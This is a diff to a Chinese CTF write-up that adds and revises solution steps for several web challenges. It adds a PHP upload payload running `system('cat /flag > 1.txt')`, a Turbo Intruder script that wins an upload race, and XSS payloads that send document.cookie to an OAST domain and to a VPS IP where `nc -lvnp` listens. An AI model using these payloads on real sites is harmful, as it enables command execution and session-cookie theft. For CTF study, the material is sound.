@@ -6,6 +6,7 @@ updated: 2026-04-26 19:51:01
 image: https://img.yanxisishi.top/images/2026/04/20260426203814880.png
 categories: [CTF]
 tags: [CTF, WP]
+
 ---
 
 ## EZREQUEST_1
@@ -442,7 +443,35 @@ if __name__ == "__main__":
 
 或者使用 Burp 的扩展插件 Turbo Intruder：
 
+1. 抓取包含 `<?php system('cat /flag > 1.txt');?>` 的上传 POST 数据包。
 
+2. 右键数据包选择 `扩展` -> `Turbo Intruder` -> `Send to turbo intruder`。
+
+3. 在弹出的 Turbo Intruder 窗口下方的代码编辑器中，使用以下 Python 脚本替换默认脚本：
+
+   ```python
+   import re
+   
+   def queueRequests(target, wordlists):
+       engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
+       for _ in range(100):
+           engine.queue(target.req)
+   
+   def handleResponse(req, interesting):
+       table.add(req)
+       if req.status == 200:
+           match = re.search(r'"file_url"\s*:\s*"([^"]+)"', req.response.decode('utf-8', 'ignore'))
+           if match:
+               path = match.group(1).replace('\\/', '/').lstrip('/')
+               # 使用 .format() 替换 f-string 以兼容 Jython 2.7
+               req.engine.queue("GET /{} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n".format(path, req.host))
+   ```
+
+   该脚本的作用是通过高并发上传该 PHP 文件，并在服务器返回随机生成的新路径时，瞬间发起读取该路径的请求。
+
+4. 点击攻击后，该插件会不断上传 `<?php system('cat /flag > 1.txt');?>` ，并不断通过发送对上传文件后回显路径的请求执行该代码。
+
+5. 1.txt 不会被删除，访问 `/uploads/1.txt` 拿到 flag 。
 
 ## EZFL
 
@@ -1340,34 +1369,43 @@ go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
 ~/go/bin/interactsh-client -http-only -v | grep --line-buffered "^GET"
 ```
 
-得到类似 `d7nknptt5p5vvca0g5cgmi1fznng3kom9.oast.fun` 。
+得到类似 `d7p078dt5p5pl7d2rce0sgweu17pbidyc.oast.me` 。
 
 在留言板输入：
 
 ```html
 <script>
 var img = document.createElement("img");
-img.src = "http://d7nknptt5p5vvca0g5cgmi1fznng3kom9.oast.fun/?c=" + encodeURIComponent(document.cookie);
+img.src = "http://d7p078dt5p5pl7d2rce0sgweu17pbidyc.oast.me/?c=" + encodeURIComponent(document.cookie);
 </script>
 ```
 
-但我失败了。
+失败了，不知道为什么，换 vps 试试：
 
-除此之外，发现站内有可写可见的地方，可以尝试写回站内。由于上传的留言是 POST 传参 `content=` ，输入：
+先 ssh 连接 vps 终端：
+
+```bash
+ssh root@39.104.82.202
+```
+
+用 nc 打开监听端口 7777 ：
+
+```bash
+nc -lvnp 7777
+```
+
+然后回留言板输入：
 
 ```html
 <script>
-fetch('/guestbook',{
-      method:'POST',
-      headers:{'Content-Type':'application/x-www-form-urlencoded'},
-      body:'content='+document.cookie
-})
+var img = document.createElement("img");
+img.src = "http://39.104.82.202:7777/?c=" + encodeURIComponent(document.cookie);
 </script>
 ```
 
 没拿到 flag 就多发几次。
 
-或者更稳点，用 `encodeURIComponent` 把字符串里的特殊字符转成 `%xx` 形式，防止它们破坏 URL 或表单参数结构。输入：
+除此之外，发现站内有可写可见的地方，可以尝试写回站内。由于上传的留言是 POST 传参 `content=` ，输入：
 
 ```html
 <script>
@@ -1380,6 +1418,8 @@ fetch('/guestbook',{
 ```
 
 依旧没拿到 flag 就多发几次。
+
+（用 `encodeURIComponent` 把字符串里的特殊字符转成 `%xx` 形式，防止它们破坏 URL 或表单参数结构，但是本题不加这个也可以，只是更稳一点。）
 
 ## EZXSS_1
 
